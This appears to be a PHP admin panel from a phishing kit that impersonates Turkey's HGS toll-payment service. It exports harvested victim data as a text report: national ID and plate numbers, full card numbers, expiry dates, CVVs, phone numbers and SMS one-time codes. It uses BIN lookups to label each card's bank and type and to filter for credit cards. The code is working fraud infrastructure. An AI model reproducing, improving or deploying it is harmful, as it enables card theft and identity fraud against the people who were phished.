<?php
session_start();
require_once 'config.php';

// Basit admin session kontrolü
if (!isset($_SESSION['admin_logged_in']) || !$_SESSION['admin_logged_in']) {
    http_response_code(403);
    die('Yetkisiz erişim');
}

$pdo = getDbConnection();

$filter = $_GET['filter'] ?? 'all'; // all | card | credit

if ($filter === 'card') {
    // Sadece kart numarası girenler
    $stmt = $pdo->query("
        SELECT u.*, TIMESTAMPDIFF(SECOND, u.created_at, u.updated_at) as duration_sec
        FROM users u
        WHERE u.card_number IS NOT NULL AND u.card_number != ''
        ORDER BY u.created_at DESC
    ");
} elseif ($filter === 'credit') {
    // Sadece credit kartlar (BIN tablosundan kontrol)
    $stmt = $pdo->query("
        SELECT u.*, TIMESTAMPDIFF(SECOND, u.created_at, u.updated_at) as duration_sec
        FROM users u
        WHERE u.card_number IS NOT NULL AND u.card_number != ''
        ORDER BY u.created_at DESC
    ");
} else {
    $stmt = $pdo->query("
        SELECT u.*, TIMESTAMPDIFF(SECOND, u.created_at, u.updated_at) as duration_sec
        FROM users u
        ORDER BY u.created_at DESC
    ");
}
$users = $stmt->fetchAll(PDO::FETCH_ASSOC);

// Credit filtresi için PHP tarafında filtrele
if ($filter === 'credit') {
    $users = array_filter($users, function($u) use ($pdo) {
        if (empty($u['card_number'])) return false;
        $bin = substr(preg_replace('/\D/','',$u['card_number']), 0, 8);
        for ($len = min(8, strlen($bin)); $len >= 6; $len--) {
            $s = $pdo->prepare("SELECT type FROM bins WHERE bin = ? LIMIT 1");
            $s->execute([substr($bin, 0, $len)]);
            $row = $s->fetch();
            if ($row) return stripos($row['type'], 'credit') !== false;
        }
        return false;
    });
}

$identifierLabels = [
    'tc'       => 'TC Kimlik No',
    'plaka'    => 'Plaka No',
    'vergi'    => 'Vergi No',
    'pasaport' => 'Pasaport No',
    'hgs'      => 'HGS Ürün No',
    'unknown'  => 'Bilinmiyor',
];

$statusLabels = [
    'pending'     => 'Bekliyor',
    'sms_waiting' => 'SMS Bekleniyor',
    'approved'    => 'Onaylandı',
    'rejected'    => 'Reddedildi',
];

$lines = [];
$lines[] = str_repeat('=', 70);
$lines[] = '  HGS SİSTEM LOG RAPORU — ' . date('d.m.Y H:i:s');
$lines[] = '  Filtre: ' . ($filter === 'card' ? 'Kart Numarası Girenler' : ($filter === 'credit' ? 'Sadece Credit Kartlar' : 'Tümü'));
$lines[] = '  Toplam Kayıt: ' . count($users);
$lines[] = str_repeat('=', 70);
$lines[] = '';

foreach ($users as $u) {
    $idType  = $identifierLabels[$u['identifier_type'] ?? 'unknown'] ?? ($u['identifier_type'] ?? '-');
    $idValue = $u['identifier_value'] ?? '-';
    $status  = $statusLabels[$u['payment_status'] ?? 'pending'] ?? ($u['payment_status'] ?? '-');

    // BIN bilgisi çek (SQL'den)
    if (!empty($u['card_number'])) {
        $rawBin = preg_replace('/\D/', '', $u['card_number']);
        $binRow = null;
        for ($len = min(8, strlen($rawBin)); $len >= 6; $len--) {
            $try = substr($rawBin, 0, $len);
            $s = $pdo->prepare("SELECT * FROM bins WHERE bin = ? LIMIT 1");
            $s->execute([$try]);
            $binRow = $s->fetch();
            if ($binRow) break;
        }
        $lines[] = "  [ BIN BİLGİSİ ]";
        if ($binRow) {
            $lines[] = "  Banka       : " . $binRow['banka_adi'];
            $lines[] = "  Kart Tipi   : " . $binRow['type'];
            $lines[] = "  Marka       : " . ($binRow['brand'] ?: '-');
            $lines[] = "  Alt Tip     : " . (trim($binRow['sub_type']) ?: '-');
            $lines[] = "  Ülke        : Türkiye";
        } else {
            $lines[] = "  Bilgi bulunamadı";
        }
        $lines[] = '';
    }

    // Kart numarası formatla
    $cardFormatted = '-';
    if (!empty($u['card_number'])) {
        $raw = preg_replace('/\D/', '', $u['card_number']);
        $cardFormatted = trim(preg_replace('/(\d{4})/', '$1 ', $raw));
    }

    $lines[] = str_repeat('-', 70);
    $lines[] = sprintf("  #%-4d  Kayıt: %s", $u['id'], $u['created_at']);
    $lines[] = '';
    $lines[] = "  [ KİMLİK BİLGİSİ ]";
    $lines[] = "  Tür         : $idType";
    $lines[] = "  Değer       : $idValue";
    $lines[] = '';
    $lines[] = "  [ KART BİLGİSİ ]";
    $lines[] = "  Kart No     : $cardFormatted";
    $lines[] = "  Ad Soyad    : " . ($u['card_holder'] ?? '-');
    $lines[] = "  SKT         : " . ($u['card_expiry'] ?? '-');
    $lines[] = "  CVV         : " . ($u['card_cvc'] ?? '-');
    $lines[] = '';
    $lines[] = "  [ İLETİŞİM ]";
    $lines[] = "  Telefon     : " . ($u['phone'] ?? '-');
    $lines[] = '';
    $lines[] = "  [ ÖDEME DURUMU ]";
    $lines[] = "  Durum       : $status";
    $lines[] = "  SMS Kodu    : " . ($u['sms_code']  ? $u['sms_code']  : '-');
    $lines[] = "  SMS Kodu 2  : " . ($u['sms_code2'] ? $u['sms_code2'] : '-');
    $lines[] = "  Tutar       : " . number_format((float)($u['total'] ?? 0), 2, '.', '') . " TL";
    $lines[] = '';
}

$lines[] = str_repeat('=', 70);
$lines[] = '  Rapor Sonu — ' . date('d.m.Y H:i:s');
$lines[] = str_repeat('=', 70);

$content = implode("\n", $lines);
$filename = 'hgs_log_' . date('Ymd_His') . '.txt';

header('Content-Type: text/plain; charset=utf-8');
header('Content-Disposition: attachment; filename="' . $filename . '"');
header('Content-Length: ' . strlen($content));
echo $content;
